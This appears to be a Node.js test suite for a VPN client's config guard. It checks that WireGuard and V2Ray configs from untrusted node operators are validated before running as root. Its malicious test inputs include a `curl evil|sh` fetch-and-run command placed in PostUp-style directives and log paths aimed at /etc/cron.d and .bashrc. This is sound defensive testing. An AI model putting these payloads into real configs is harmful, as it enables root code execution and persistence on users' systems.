import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  assertSafeWireguardConfig,
  extractWireguardEndpointHost,
  isAllowedBypassCidr,
  sanitizeBypassRoutes,
  assertSafeV2RayConfig,
} from './config-guard.ts'

// A representative clean WireGuard config built from a node handshake.
const CLEAN_WG = `[Interface]
PrivateKey = aGVsbG8td29ybGQtcHJpdmF0ZS1rZXktYmFzZTY0PT0=
Address = 10.8.0.2/32
DNS = 10.8.0.1
MTU = 1420

[Peer]
PublicKey = c29tZS1wdWJsaWMta2V5LWluLWJhc2U2NC1mb3JtYXQ9
PresharedKey = cHNrLWtleS1iYXNlNjQtZW5jb2RlZC12YWx1ZS09PQ==
AllowedIPs = 0.0.0.0/0
Endpoint = 203.0.113.7:51820
PersistentKeepalive = 25
`

test('assertSafeWireguardConfig accepts a clean Interface/Peer config', () => {
  assert.doesNotThrow(() => assertSafeWireguardConfig(CLEAN_WG))
})

// The core LPE vector: wg-quick executes these directives as root.
for (const directive of ['PostUp', 'PreUp', 'PostDown', 'PreDown', 'Table', 'SaveConfig']) {
  test(`assertSafeWireguardConfig rejects ${directive} directive`, () => {
    const evil = CLEAN_WG.replace('MTU = 1420', `${directive} = /bin/sh -c "curl evil|sh"`)
    assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
  })
}

test('assertSafeWireguardConfig rejects PostUp regardless of case/spacing', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'postup=touch /tmp/pwned')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig rejects an unknown key (allow-list, not blocklist)', () => {
  const evil = CLEAN_WG.replace('MTU = 1420', 'Whatever = 7')
  assert.throws(() => assertSafeWireguardConfig(evil), /not allowed|invalid/i)
})

test('assertSafeWireguardConfig ignores comments and blank lines', () => {
  const withComments = `# generated\n\n${CLEAN_WG}\n# trailing comment\n`
  assert.doesNotThrow(() => assertSafeWireguardConfig(withComments))
})

test('assertSafeWireguardConfig rejects a key outside any section', () => {
  assert.throws(() => assertSafeWireguardConfig('PostUp = x\n[Interface]\nPrivateKey = a'), /not allowed|invalid/i)
})

test('extractWireguardEndpointHost returns the host before the port', () => {
  assert.equal(extractWireguardEndpointHost(CLEAN_WG), '203.0.113.7')
})

test('extractWireguardEndpointHost tolerates missing spaces around =', () => {
  assert.equal(extractWireguardEndpointHost('[Peer]\nEndpoint=198.51.100.4:1194'), '198.51.100.4')
})

test('extractWireguardEndpointHost returns null when no Endpoint present', () => {
  assert.equal(extractWireguardEndpointHost('[Interface]\nPrivateKey = a'), null)
})

// H3: split-tunnel bypass routes flow to `ip route add ... via <real gateway>` as root.
test('isAllowedBypassCidr accepts normal private CIDRs', () => {
  assert.equal(isAllowedBypassCidr('10.0.0.0/8'), true)
  assert.equal(isAllowedBypassCidr('192.168.1.0/24'), true)
  assert.equal(isAllowedBypassCidr('203.0.113.7/32'), true)
})

test('isAllowedBypassCidr rejects the default-route swallow vectors', () => {
  assert.equal(isAllowedBypassCidr('0.0.0.0/0'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/1'), false)
  assert.equal(isAllowedBypassCidr('0.0.0.0/8'), false)
})

test('isAllowedBypassCidr rejects out-of-range octets and prefixes', () => {
  assert.equal(isAllowedBypassCidr('999.0.0.1/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0/33'), false)
  assert.equal(isAllowedBypassCidr('10.0.0/8'), false)
  assert.equal(isAllowedBypassCidr('10.0.0.0'), false)
  assert.equal(isAllowedBypassCidr('garbage'), false)
  assert.equal(isAllowedBypassCidr(''), false)
})

test('sanitizeBypassRoutes drops invalid entries and caps the list', () => {
  assert.deepEqual(sanitizeBypassRoutes(['10.0.0.0/8', '0.0.0.0/0', 'junk']), ['10.0.0.0/8'])
  assert.deepEqual(sanitizeBypassRoutes(['  192.168.0.0/16  ']), ['192.168.0.0/16'])
  assert.equal(sanitizeBypassRoutes(Array(200).fill('10.0.0.0/8')).length <= 64, true)
})

// C2: V2Ray config is spawned as a child process; node operators are untrusted.
const CLEAN_V2RAY = {
  log: { loglevel: 'none' },
  inbounds: [{ protocol: 'socks', listen: '127.0.0.1', port: 1080 }],
  outbounds: [
    { protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } },
    { protocol: 'freedom' },
  ],
}

test('assertSafeV2RayConfig accepts a clean local-SOCKS / vmess config', () => {
  assert.doesNotThrow(() => assertSafeV2RayConfig(CLEAN_V2RAY))
})

test('assertSafeV2RayConfig rejects a log file path (arbitrary file write vector)', () => {
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { access: '/etc/cron.d/x' } }), /log|not allowed|invalid/i)
  assert.throws(() => assertSafeV2RayConfig({ ...CLEAN_V2RAY, log: { error: '/home/user/.bashrc' } }), /log|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects an inbound bound to a non-loopback address', () => {
  const evil = { ...CLEAN_V2RAY, inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }] }
  assert.throws(() => assertSafeV2RayConfig(evil), /loopback|listen|not allowed|invalid/i)
})

test('assertSafeV2RayConfig rejects a config with no outbounds', () => {
  assert.throws(() => assertSafeV2RayConfig({ inbounds: [] }), /outbound|invalid/i)
  assert.throws(() => assertSafeV2RayConfig(null), /invalid/i)
  assert.throws(() => assertSafeV2RayConfig('not an object'), /invalid/i)
})
